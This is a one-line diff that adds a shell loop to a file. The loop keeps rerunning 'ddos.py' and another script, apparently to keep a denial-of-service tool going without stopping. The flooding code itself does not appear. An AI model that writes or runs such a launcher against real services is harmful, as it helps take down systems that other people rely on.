@@ -1,0 +1,1 @@
+while true; do python3 ddos.py ; python3 script.py; done
